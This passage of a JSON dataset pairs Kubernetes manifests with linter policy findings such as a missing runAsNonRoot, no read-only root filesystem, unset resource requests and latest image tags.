    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"study-builder\" is not set to runAsNonRoot"
  },
  {
    "id": "01520",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cloudsql-proxy\" has cpu request 0"
  },
  {
    "id": "01521",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cloudsql-proxy\" has memory limit 0"
  },
  {
    "id": "01522",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"study-builder\" has memory limit 0"
  },
  {
    "id": "01523",
    "manifest_path": "data/manifests/the_stack_sample/sample_0493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"pod-identity-webhook\" is using an invalid container image, \"IMAGE\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01524",
    "manifest_path": "data/manifests/the_stack_sample/sample_0493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pod-identity-webhook\" does not have a read-only root file system"
  },
  {
    "id": "01525",
    "manifest_path": "data/manifests/the_stack_sample/sample_0493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pod-identity-webhook\" is not set to runAsNonRoot"
  },
  {
    "id": "01526",
    "manifest_path": "data/manifests/the_stack_sample/sample_0493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pod-identity-webhook\" has cpu request 0"
  },
  {
    "id": "01527",
    "manifest_path": "data/manifests/the_stack_sample/sample_0493.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pod-identity-webhook\" has memory limit 0"
  },
  {
    "id": "01528",
    "manifest_path": "data/manifests/the_stack_sample/sample_0494.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: default\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20200529-d374280316\n          args:\n          - --config-path=/etc/config/config.yaml\n          - --job-config-path=/etc/job-config\n          - --github-token-path=/etc/github/oauth\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n          - name: job-config\n            mountPath: /etc/job-config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: config\n        - name: job-config\n          configMap:\n            name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"branchprotector\" does not have a read-only root file system"
  },
  {
    "id": "01529",
    "manifest_path": "data/manifests/the_stack_sample/sample_0494.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: default\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20200529-d374280316\n          args:\n          - --config-path=/etc/config/config.yaml\n          - --job-config-path=/etc/job-config\n          - --github-token-path=/etc/github/oauth\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n          - name: job-config\n            mountPath: /etc/job-config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: config\n        - name: job-config\n          configMap:\n            name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"branchprotector\" is not set to runAsNonRoot"
  },
  {
    "id": "01530",
    "manifest_path": "data/manifests/the_stack_sample/sample_0494.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: default\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20200529-d374280316\n          args:\n          - --config-path=/etc/config/config.yaml\n          - --job-config-path=/etc/job-config\n          - --github-token-path=/etc/github/oauth\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n          - name: job-config\n            mountPath: /etc/job-config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: config\n        - name: job-config\n          configMap:\n            name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"branchprotector\" has cpu request 0"
  },
  {
    "id": "01531",
    "manifest_path": "data/manifests/the_stack_sample/sample_0494.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  namespace: default\n  name: branchprotector\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: branchprotector\n          image: gcr.io/k8s-prow/branchprotector:v20200529-d374280316\n          args:\n          - --config-path=/etc/config/config.yaml\n          - --job-config-path=/etc/job-config\n          - --github-token-path=/etc/github/oauth\n          - --confirm\n          - --github-endpoint=http://ghproxy\n          - --github-endpoint=https://api.github.com\n          volumeMounts:\n          - name: oauth\n            mountPath: /etc/github\n            readOnly: true\n          - name: config\n            mountPath: /etc/config\n            readOnly: true\n          - name: job-config\n            mountPath: /etc/job-config\n            readOnly: true\n        volumes:\n        - name: oauth\n          secret:\n            secretName: oauth-token\n        - name: config\n          configMap:\n            name: config\n        - name: job-config\n          configMap:\n            name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"branchprotector\" has memory limit 0"
  },
  {
    "id": "01532",
    "manifest_path": "data/manifests/the_stack_sample/sample_0499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: sample-app\n  name: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      labels:\n        app: sample-app\n        fluent-pvc-operator.tech.zozo.com/fluent-pvc-name: fluent-pvc-operator-example-log-collection\n    spec:\n      containers:\n      - name: sample-app\n        image: fluent-pvc-operator-sample-app:development\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n        env:\n        - name: BENCHMARK_LOGGING_MAX_LOG_COUNT\n          value: '10000'\n        - name: BENCHMARK_LOGGING_INTERVAL_MILLIS\n          value: '1000'\n        - name: BENCHMARK_LOGGING_EVENT_NAME\n          value: test-event\n        - name: BENCHMARK_LOGGING_PAYLOAD_KEY1\n          value: myKey1\n        - name: BENCHMARK_LOGGING_PAYLOAD_VALUE1\n          value: myValue1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sample-app\" does not have a read-only root file system"
  },
  {
    "id": "01533",
    "manifest_path": "data/manifests/the_stack_sample/sample_0499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: sample-app\n  name: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      labels:\n        app: sample-app\n        fluent-pvc-operator.tech.zozo.com/fluent-pvc-name: fluent-pvc-operator-example-log-collection\n    spec:\n      containers:\n      - name: sample-app\n        image: fluent-pvc-operator-sample-app:development\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n        env:\n        - name: BENCHMARK_LOGGING_MAX_LOG_COUNT\n          value: '10000'\n        - name: BENCHMARK_LOGGING_INTERVAL_MILLIS\n          value: '1000'\n        - name: BENCHMARK_LOGGING_EVENT_NAME\n          value: test-event\n        - name: BENCHMARK_LOGGING_PAYLOAD_KEY1\n          value: myKey1\n        - name: BENCHMARK_LOGGING_PAYLOAD_VALUE1\n          value: myValue1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sample-app\" is not set to runAsNonRoot"
  },
  {
    "id": "01534",
    "manifest_path": "data/manifests/the_stack_sample/sample_0499.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: sample-app\n  name: sample-app\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample-app\n  template:\n    metadata:\n      labels:\n        app: sample-app\n        fluent-pvc-operator.tech.zozo.com/fluent-pvc-name: fluent-pvc-operator-example-log-collection\n    spec:\n      containers:\n      - name: sample-app\n        image: fluent-pvc-operator-sample-app:development\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 100m\n            memory: 50Mi\n        env:\n        - name: BENCHMARK_LOGGING_MAX_LOG_COUNT\n          value: '10000'\n        - name: BENCHMARK_LOGGING_INTERVAL_MILLIS\n          value: '1000'\n        - name: BENCHMARK_LOGGING_EVENT_NAME\n          value: test-event\n        - name: BENCHMARK_LOGGING_PAYLOAD_KEY1\n          value: myKey1\n        - name: BENCHMARK_LOGGING_PAYLOAD_VALUE1\n          value: myValue1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sample-app\" has cpu request 0"
  },
  {
    "id": "01535",
    "manifest_path": "data/manifests/the_stack_sample/sample_0505.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myjavaapp-deploy\n  labels:\n    app: myjavaapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: myjavaapp\n  template:\n    metadata:\n      labels:\n        app: myjavaapp\n    spec:\n      containers:\n      - name: myjavaapp-container\n        image: nagendra464/deployimage:1\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"myjavaapp-container\" does not have a read-only root file system"
  },
  {
    "id": "01536",
    "manifest_path": "data/manifests/the_stack_sample/sample_0505.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myjavaapp-deploy\n  labels:\n    app: myjavaapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: myjavaapp\n  template:\n    metadata:\n      labels:\n        app: myjavaapp\n    spec:\n      containers:\n      - name: myjavaapp-container\n        image: nagendra464/deployimage:1\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"myjavaapp-container\" is not set to runAsNonRoot"
  },
  {
    "id": "01537",
    "manifest_path": "data/manifests/the_stack_sample/sample_0505.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myjavaapp-deploy\n  labels:\n    app: myjavaapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: myjavaapp\n  template:\n    metadata:\n      labels:\n        app: myjavaapp\n    spec:\n      containers:\n      - name: myjavaapp-container\n        image: nagendra464/deployimage:1\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"myjavaapp-container\" has cpu request 0"
  },
  {
    "id": "01538",
    "manifest_path": "data/manifests/the_stack_sample/sample_0505.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myjavaapp-deploy\n  labels:\n    app: myjavaapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: myjavaapp\n  template:\n    metadata:\n      labels:\n        app: myjavaapp\n    spec:\n      containers:\n      - name: myjavaapp-container\n        image: nagendra464/deployimage:1\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"myjavaapp-container\" has memory limit 0"
  },
  {
    "id": "01539",
    "manifest_path": "data/manifests/the_stack_sample/sample_0507.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:latest\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n",
    "policy_id": "latest-tag",
